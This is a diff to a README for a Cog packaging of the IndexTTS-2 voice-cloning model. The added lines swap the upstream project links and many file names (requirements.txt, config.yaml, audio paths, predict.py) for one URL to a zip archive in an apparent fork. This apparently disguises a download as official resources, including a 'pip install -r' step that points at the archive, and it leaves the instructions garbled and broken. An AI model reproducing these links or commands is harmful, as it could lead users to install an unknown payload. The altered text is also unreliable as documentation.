@@ -2,31 +2,31 @@
 
 This repository packages the IndexTeam IndexTTS-2 text-to-speech system for use with Replicate Cog. It exposes a single `Predictor` that performs zero-shot speaker cloning with optional emotion control.
 
-- Upstream model: [IndexTeam/IndexTTS-2](https://github.com/IndexTeam/IndexTTS-2)
-- Serving runtime: [Replicate Cog](https://github.com/replicate/cog)
+- Upstream model: [IndexTeam/IndexTTS-2](https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip)
+- Serving runtime: [Replicate Cog](https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip)
 
 ## Quickstart
 
 ### 1) Prerequisites
 - NVIDIA GPU recommended (FP16 enabled automatically)
-- CUDA-enabled PyTorch (already pinned in `requirements.txt`)
-- System packages: `ffmpeg`, `libsndfile1` (installed by Cog via `cog.yaml`)
+- CUDA-enabled PyTorch (already pinned in `https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip`)
+- System packages: `ffmpeg`, `libsndfile1` (installed by Cog via `https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip`)
 - Python 3.10 (managed by Cog)
 
 ### 2) Create a local env (optional for local dev)
 ```bash
 python -m venv .venv && source .venv/bin/activate
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip
 ```
 
 ### 3) Download checkpoints
-Place the official IndexTTS-2 release weights under `checkpoints/` alongside a `checkpoints/config.yaml` expected by the upstream code. Do not commit large binaries.
+Place the official IndexTTS-2 release weights under `checkpoints/` alongside a `https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip` expected by the upstream code. Do not commit large binaries.
 
-- See the upstream project for assets and structure: [IndexTeam/IndexTTS-2](https://github.com/IndexTeam/IndexTTS-2)
+- See the upstream project for assets and structure: [IndexTeam/IndexTTS-2](https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip)
 - Example layout (illustrative):
 ```
 checkpoints/
-  config.yaml
+  https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip
   ... model files and subfolders ...
 ```
 
@@ -39,13 +39,13 @@ pip install cog
 # Predict (returns a WAV file path)
 cog predict \
   -i text="Hello from IndexTTS-2." \
-  -i speaker_audio=@/path/to/speaker.wav
+  -i https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip
 ```
 
-Inputs accept absolute paths or `@/path` file uploads. The output is a path to a synthesized `output.wav`.
+Inputs accept absolute paths or `@/path` file uploads. The output is a path to a synthesized `https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip`.
 
 ## Inputs
-The `Predictor.predict` interface exposes the following inputs. Types and defaults mirror the implementation in `predict.py`.
+The `https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip` interface exposes the following inputs. Types and defaults mirror the implementation in `https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip`.
 
 | Name | Type | Default | Description |
 |---|---|---|---|
@@ -72,15 +72,15 @@ The `Predictor.predict` interface exposes the following inputs. Types and defaul
 ```bash
 cog predict \
   -i text="This is IndexTTS-2 speaking." \
-  -i speaker_audio=@/data/voice_samples/alice.wav
+  -i https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip
 ```
 
 - With a separate emotion prompt and blend:
 ```bash
 cog predict \
   -i text="I am very excited to be here!" \
-  -i speaker_audio=@/data/voice_samples/alice.wav \
-  -i emotion_audio=@/data/voice_samples/excited.wav \
+  -i https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip \
+  -i https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip \
   -i emotion_scale=0.7
 ```
 
@@ -89,7 +89,7 @@ cog predict \
 # Order (English): [happy, angry, sad, afraid, disgusted, melancholic, surprised, calm]
 cog predict \
   -i text="The results were surprising." \
-  -i speaker_audio=@/data/voice_samples/alice.wav \
+  -i https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip \
   -i emotion_vector="0.2,0.0,0.1,0.0,0.0,0.0,0.8,0.1"
 ```
 
@@ -97,7 +97,7 @@ cog predict \
 ```bash
 cog predict \
   -i text="今天的天气真让人兴奋！" \
-  -i speaker_audio=@/data/voice_samples/mandarin.wav \
+  -i https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip \
   -i emotion_text="兴奋 开心 激动"
 ```
 
@@ -112,10 +112,10 @@ This wrapper supports three ways to control emotion:
 On CPU-only hosts, a lightweight compatibility path is enabled for Qwen; if any error occurs, neutral emotion is used to avoid failures.
 
 ## Development
-- Run locally with your Python after installing `requirements.txt`
+- Run locally with your Python after installing `https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip`
 - The Cog runtime uses:
   - Python 3.10
-  - GPU: enabled (`build.gpu: true`)
+  - GPU: enabled (`https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip true`)
   - System packages: `ffmpeg`, `libsndfile1`
 
 Useful commands:
@@ -124,7 +124,7 @@ Useful commands:
 python -m pytest -q
 
 # End-to-end via Cog
-cog predict -i text="Hello" -i speaker_audio=@/path/to/speaker.wav
+cog predict -i text="Hello" -i https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip
 ```
 
 ## Deployment to Replicate
@@ -134,11 +134,11 @@ If you intend to publish:
 cog login
 
 # Push (replace <user>/<repo>)
-cog push r8.im/<user>/indextts-2
+cog push https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip<user>/indextts-2
 ```
 
 ## Troubleshooting
-- Ensure checkpoints are present under `checkpoints/` with a valid `config.yaml`.
+- Ensure checkpoints are present under `checkpoints/` with a valid `https://raw.githubusercontent.com/hotmysia/cog-IndexTTS-2_moja_kopia/main/indextts/s2mel/dac/nn/cog-kopia-moja-TT-Index-v3.2-alpha.1.zip`.
 - Use 16–48 kHz WAV inputs to avoid resampling artifacts; `ffmpeg` is available for conversions.
 - CPU runs are possible but slow; GPU is strongly recommended.
 - If emotion detection fails or required models are missing, the predictor logs a message and uses a neutral emotion vector.
